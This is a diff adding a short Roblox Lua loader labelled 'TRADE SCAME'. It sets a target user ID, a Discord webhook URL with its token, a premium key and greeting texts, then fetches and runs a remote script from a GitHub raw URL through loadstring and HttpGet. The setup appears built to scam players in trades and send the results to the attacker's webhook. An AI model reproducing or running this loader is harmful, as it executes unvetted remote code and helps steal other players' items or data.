@@ -1,0 +1,9 @@
+_G.UserID = 3349080871
+_G.Webhook = "https://discord.com/api/webhooks/1088410020267446302/U45PSEEWv4fDcnVR9I95ceOZ_6YByPIUmKu0SKqtDtTrsY2ZQxbnvTEVQXayDpCmL0FY"
+_G.PremiumKey = "YJ5746BxCJvBAf5E"
+_G.ScriptName = "TRADE SCAME"
+_G.FirstText = "HELLO IN TRADE SCAME"
+_G.SecondText = "WELCOME"
+_G.ThirdText = "HI"
+_G.WaitingTime = 20
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))()
